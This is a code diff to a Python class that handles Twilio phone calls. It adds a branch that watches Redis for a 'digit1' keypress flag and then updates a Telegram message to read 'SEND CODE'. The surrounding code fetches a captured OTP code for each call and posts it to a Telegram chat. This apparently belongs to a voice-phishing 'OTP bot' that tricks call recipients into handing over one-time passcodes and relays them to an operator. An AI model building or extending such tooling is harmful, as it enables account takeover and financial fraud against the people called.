@@ -115,6 +115,7 @@ class TwilioHandler:
                     call = self.client.calls(call.sid).fetch()
                     call_status = call.status
 
+                    # Check for digit 1 press
                     if not otp_displayed:
                         otp_code = redis_client.get(f"otp:{call.sid}")
                         if otp_code:
@@ -135,6 +136,15 @@ class TwilioHandler:
                             )
                             otp_displayed = True
                             redis_client.delete(f"otp:{call.sid}")
+                        # Add this section to check for digit 1
+                        elif redis_client.get(f"digit1:{call.sid}"):
+                            self.bot.edit_message_text(
+                                "📲 *SEND CODE* 🔐",
+                                chat_id=chat_id,
+                                message_id=status_message.message_id,
+                                parse_mode="Markdown"
+                            )
+                            redis_client.delete(f"digit1:{call.sid}")
 
                     if call_status != last_status:
                         if call_status == 'completed':
